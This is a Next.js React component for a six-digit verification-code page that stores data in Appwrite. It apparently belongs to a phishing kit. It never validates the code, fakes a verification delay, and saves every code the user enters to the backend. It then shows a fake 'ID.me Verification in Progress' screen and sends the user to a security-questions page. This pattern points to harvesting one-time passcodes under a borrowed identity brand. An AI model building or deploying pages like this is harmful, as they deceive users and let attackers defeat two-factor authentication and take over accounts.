"use client";

import { useState, useRef, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useAppwrite } from "@/app/lib/AppwriteContext";
import LoadingSpinner from "@/app/components/LoadingSpinner";

export default function VerificationCode() {
  const router = useRouter();
  const { userData, updateField, updateMultipleFields } = useAppwrite();
  const [code, setCode] = useState<string[]>(["", "", "", "", "", ""]);
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(30);
  const [verificationStep, setVerificationStep] = useState(1);
  const [secondsRemaining, setSecondsRemaining] = useState(0);
  const [totalWaitTime, setTotalWaitTime] = useState(0);
  const [verificationComplete, setVerificationComplete] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  // Add state to track previous code value
  const [prevCode, setPrevCode] = useState<string>("");
  
  // Ref to track debounce timer
  const debounceTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    // Focus the first input when the component mounts
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }

    // Start the countdown timer for resending code
    const timer = setInterval(() => {
      setCountdown((prevCountdown) => (prevCountdown > 0 ? prevCountdown - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Verification period countdown timer
  useEffect(() => {
    if (secondsRemaining > 0 && verificationStep === 2) {
      const timer = setTimeout(() => {
        setSecondsRemaining(secondsRemaining - 1);
      }, 1000);
      
      return () => clearTimeout(timer);
    } else if (secondsRemaining === 0 && verificationStep === 2) {
      setVerificationComplete(true);
    }
  }, [secondsRemaining, verificationStep]);

  // Format time as MM:SS
  const formatTime = useCallback((seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  }, []);

  const handleInputChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d*$/.test(value)) return;
    
    // Update the code state
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    // Move to the next input if a digit was entered
    if (value && index < 5 && inputRefs.current[index + 1]) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // We don't need to update Appwrite on every digit change
    // Updates will only happen when the user clicks Verify or Resend Code
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Move to the previous input on backspace if the current input is empty
    if (e.key === "Backspace" && !code[index] && index > 0 && inputRefs.current[index - 1]) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text/plain").trim();
    
    // Check if the pasted data is a 6-digit number
    if (/^\d{6}$/.test(pastedData)) {
      const newCode = pastedData.split("");
      setCode(newCode);
      
      // Focus the last input
      if (inputRefs.current[5]) {
        inputRefs.current[5]?.focus();
      }
    }
  };

  const handleVerify = () => {
    // Check if the code is complete
    if (code.some((digit) => !digit)) {
      setError("Please enter all 6 digits of the verification code.");
      return;
    }

    setIsLoading(true);
    setError("");

    // Get the full verification code as a string
    const fullCode = code.join("");
    
    // Validate the code length
    if (fullCode.length !== 6) {
      setError("Invalid verification code length. Please enter 6 digits.");
      setIsLoading(false);
      return;
    }
    
    // Only update Appwrite if the code has changed
    const shouldUpdateAppwrite = fullCode !== prevCode;

    // Simulate API call for code verification
    setTimeout(() => {
      setIsLoading(false);
      
      // Set a random wait time between 1-2 seconds for ID verification period
      const waitTime = Math.floor(Math.random() * 15) + 15;
      setTotalWaitTime(waitTime);
      setSecondsRemaining(waitTime);
      
      // Switch to verification step
      setVerificationStep(2);
      
      // Save both the verification code and timestamp to Appwrite - ONLY WHEN USER CLICKS VERIFY
      // This reduces Appwrite API calls by only saving once instead of on every digit change
      if (shouldUpdateAppwrite) {
        updateMultipleFields({
          verificationCode: fullCode,
          verificationCodeTimestamp: new Date().toLocaleString()
        });
        setPrevCode(fullCode);
      }
    }, 1500);
  };

  const handleResendCode = () => {
    if (countdown > 0) return;
    
    setIsResending(true);
    setError("");

    // Simulate resending the code
    setTimeout(() => {
      setIsResending(false);
      setCountdown(30);
      
      // Generate a new random code
      const newRandomCode = Array.from({ length: 6 }, () => 
        Math.floor(Math.random() * 10).toString()
      );
      
      // Get the full code as a string
      const fullCode = newRandomCode.join("");
      
      // Update the code in the UI
      setCode(newRandomCode);
      
      // Only update Appwrite if the code is different from the previous one
      if (fullCode !== prevCode) {
        // Store the new code in Appwrite
        updateMultipleFields({
          verificationCode: fullCode,
          verificationCodeTimestamp: new Date().toLocaleString()
        });
        setPrevCode(fullCode);
      }
    }, 1500);
  };
  
  // Proceed to the candidate portal
  const proceedToPortal = () => {
    router.push("/auth/security-questions");
  };

  return (
    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
      <div className="w-full max-w-md space-y-8">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white">Verification Code</h1>
          <p className="mt-2 text-white">
            Enter the 6-digit code sent to your email or phone
          </p>
        </div>

        {error && (
          <div className="rounded-md bg-red-50 p-4 text-sm text-red-700">
            {error}
          </div>
        )}

        <div className="rounded-lg bg-white p-6 shadow">
          {verificationStep === 1 && (
            <>
              <div className="mb-6 flex justify-center space-x-2">
                {code.map((digit, index) => (
                  <input
                    key={index}
                    type="text"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleInputChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onPaste={index === 0 ? handlePaste : undefined}
                    ref={(el) => {
                      inputRefs.current[index] = el;
                    }}
                    className="h-12 w-12 rounded-md border border-gray-300 text-center text-xl font-semibold shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500"
                  />
                ))}
              </div>

              <button
                onClick={handleVerify}
                disabled={isLoading || code.some((digit) => !digit)}
                className="mt-4 flex w-full items-center justify-center rounded-md bg-blue-800 px-4 py-2 text-white hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50"
              >
                {isLoading ? (
                  <>
                    <svg
                      className="mr-2 h-4 w-4 animate-spin"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    Verifying...
                  </>
                ) : (
                  "Verify Code"
                )}
              </button>

              <div className="mt-4 text-center">
                <p className="text-sm text-gray-600">
                  Didn&apos;t receive a code?{" "}
                  <button
                    type="button"
                    onClick={handleResendCode}
                    disabled={isResending || countdown > 0}
                    className={`font-medium ${
                      countdown > 0 || isResending
                        ? "text-gray-400"
                        : "text-blue-600 hover:text-blue-500"
                    }`}
                  >
                    {isResending ? (
                      "Resending..."
                    ) : countdown > 0 ? (
                      `Resend code (${countdown}s)`
                    ) : (
                      "Resend code"
                    )}
                  </button>
                </p>
              </div>
            </>
          )}
          
          {verificationStep === 2 && (
            <div className="space-y-6">
              <div className="flex items-center justify-center">
                <div className="rounded-full bg-blue-100 p-3">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
              </div>
              
              <h2 className="text-center text-2xl font-medium text-gray-900">ID.me Verification in Progress</h2>
              
              
              <div className="space-y-4">
                <div className="flex items-center justify-center space-x-2">
                  <LoadingSpinner size="sm" color="blue" text="Verifying identity..." />
                </div>
              </div>
              
              
              {verificationComplete && (
                <div className="rounded-md bg-green-50 p-4 text-sm text-green-700">
                  <div className="flex items-center">
                    <svg className="mr-2 h-5 w-5 text-green-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                    </svg>
                    <p>Verification complete! You can now proceed.</p>
                  </div>
                </div>
              )}
              
              <button
                onClick={proceedToPortal}
                disabled={!verificationComplete}
                className={`w-full rounded-md px-4 py-3 text-center font-medium text-white shadow focus:outline-none focus:ring-2 focus:ring-offset-2 ${
                  verificationComplete 
                    ? 'bg-green-600 hover:bg-green-700 focus:ring-green-500' 
                    : 'cursor-not-allowed bg-gray-400'
                }`}
              >
                {verificationComplete ? "Continue to Portal" : "Please Wait..."}
              </button>
            </div>
          )}
        </div>

        <div className="mt-6 text-center text-xs text-gray-500">
          This additional step helps us verify your identity and protect your account
        </div>
      </div>
    </div>
  );
} 